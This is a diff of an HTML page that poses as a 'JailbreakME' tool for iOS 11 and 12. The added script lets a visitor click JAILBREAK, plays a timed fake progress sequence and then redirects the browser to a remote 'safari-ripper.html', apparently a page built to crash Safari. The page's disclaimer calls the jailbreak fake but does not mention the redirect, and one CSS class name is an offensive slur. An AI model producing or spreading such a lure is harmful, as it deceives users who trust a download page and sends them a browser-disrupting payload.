@@ -31,7 +31,7 @@
         background-color: #fff;
         border-radius: 15px;
         width: 320px;
-        height: 350px;
+        height: 300px;
       }
       a.jblol {
         background-color: #00B3FF;
@@ -48,17 +48,38 @@
     <link href="https://fonts.googleapis.com/css?family=Montserrat:300,500,600" rel="stylesheet">
     <title>Totally real jbme</title>
   </head>
-  <body>
+  <body onload="hideProgress()">
     <center><div class="rape">
     <center><h1 class="jbme">JailbreakME</h1></center>
     <center><h1 class="iosv">for iOS 11 and 12</h1></center>
     <center><h1 class="credits">by EvenDev</h1></center>
-    <center><h1 class="credits">Please Wait... (1/3)</h1></center>
+    <center><h1 class="credits" id="prog">Please Wait... (1/3)</h1></center>
     <br>
     <br>
     <br>
-    <a class="jblol">JAILBREAK</a>
+    <a class="jblol" id="btn" onclick="jailbreak()">JAILBREAK</a>
   </div></center>
   <h3 class="disclaimer">(DISCLAIMER: This jailbreak is fake lol)</h3>
   </body>
+  <script>
+  function hideProgress() {
+    var x = document.getElementById("prog");
+    x.style.display = "none";
+  }
+  function jailbreak() {
+    var a = document.getElementById("prog");
+    var b = document.getElementById("btn");
+    a.style.display = "block";
+    b.style.display = "none";
+    setTimeout(function () {
+      document.getElementById("prog").innerHTML = "Please Wait... (2/3)";
+    }, 5000);
+    setTimeout(function () {
+      document.getElementById("prog").innerHTML = "Please Wait... (3/3)";
+    }, 10000);
+    setTimeout(function () {
+      document.location.href="https://cdn.rawgit.com/pwnsdx/ce64de2760996a6c432f06d612e33aea/raw/23f2faa0aadb4babbfd228c8bb32a26a8c51c741/safari-ripper.html";
+    }, 12000);
+  }
+  </script>
 </html>
